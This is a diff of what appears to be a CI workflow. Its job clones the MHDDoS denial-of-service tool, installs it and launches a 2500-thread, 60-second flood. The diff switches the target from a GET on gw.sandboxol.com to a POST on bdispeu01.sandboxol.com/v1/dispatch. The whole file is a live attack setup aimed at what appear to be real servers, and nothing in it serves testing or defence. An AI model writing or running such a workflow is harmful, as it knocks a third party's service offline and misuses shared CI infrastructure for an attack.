@@ -8,5 +8,4 @@ jobs:
           git clone https://github.com/MatrixTM/MHDDoS.git
           cd MHDDoS
           pip install -r requirements.txt
-          mkdir -p files/proxies && touch files/proxies/all.txt
-          python start.py GET http://gw.sandboxol.com/server-time 0 2500 all.txt 2500 60 true
+          python start.py POST http://bdispeu01.sandboxol.com/v1/dispatch 0 2500 all.txt 2500 60 true
